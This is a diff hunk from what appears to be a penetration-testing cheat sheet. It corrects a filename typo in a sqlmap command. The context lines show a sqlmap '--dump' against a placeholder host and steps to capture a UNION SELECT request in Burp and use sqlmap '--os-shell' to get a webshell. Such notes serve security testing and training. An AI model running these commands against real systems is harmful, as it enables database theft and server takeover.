@@ -172,7 +172,7 @@ sqlmap -u http://ip/page.php?user=dummy -p user --dump # time consuming
 
 Intercept a `UNION SELECT` in Burp and record the `POST` as a file. Then use sqlmap to get a webshell:
 ```
-sqlmap -r post_request_save_as_a_file.txt -p some_input_parameter_in_the_post_request --os-shell --web-root "/var/www/html/tmp"
+sqlmap -r post_request_saved_as_a_file.txt -p some_input_parameter_in_the_post_request --os-shell --web-root "/var/www/html/tmp"
 ```
 
 
